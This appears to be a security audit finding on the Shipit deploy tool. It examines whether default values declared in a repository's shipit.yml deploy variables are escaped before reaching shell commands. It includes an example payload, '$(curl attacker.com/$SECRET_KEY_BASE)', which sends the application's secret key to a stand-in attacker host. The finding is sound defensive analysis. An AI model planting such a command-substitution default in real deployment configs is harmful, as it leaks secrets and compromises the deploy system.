`Shipit::DeploySpec#deploy_variables` (app/models/shipit/deploy_spec.rb) is `Array.wrap(config('deploy', 'variables')).map(&VariableDefinition.method(:new))`, and `#default_deploy_env` is `deploy_variables.map { |v| [v.name, v.default] }.to_h`, both sourced from the repository's own `shipit.yml`. Attacker action: contributor's `shipit.yml` declares `deploy.variables: [{name: 'SOME_VAR', default: '$(curl attacker.com/$SECRET_KEY_BASE)'}]` with no explicit value ever submitted by a human, relying purely on the default. Preconditions: default is used because the deployer never overrides it (`Stack#trigger_task`/`build_deploy` calls `definition.variables_with_defaults.each { |v| env[v.name] ||= v.default }`). Call sequence: default string becomes `env['SOME_VAR']`, passes `filter_deploy_envs`/`filter_envs` trivially (its own declared name), then any step referencing `$SOME_VAR` gets it substituted via `Shellwords.escape` (so it's inert as shell syntax) but if a later step *itself* is constructed by string concatenation with `$SOME_VAR` outside of the Command args (e.g. templated into another config value read via `config()`), the escaping guarantee may not apply. Binding: a default value declared in `deploy.variables`/`config('deploy','variables')` must be treated with the same escaping guarantee as a user-submitted value at every place it is later interpolated, exactly once. Scoped impact: Critical if any code path reuses `default_deploy_env` values outside of `Command#interpolated_arguments`'s single-escape guarantee. Proof idea: `DeploySpecTest` asserting `@spec.default_deploy_env` returns the raw attacker string unmodified, then a `Command` test confirming it is escaped exactly once wherever it reaches `PTY.spawn`.
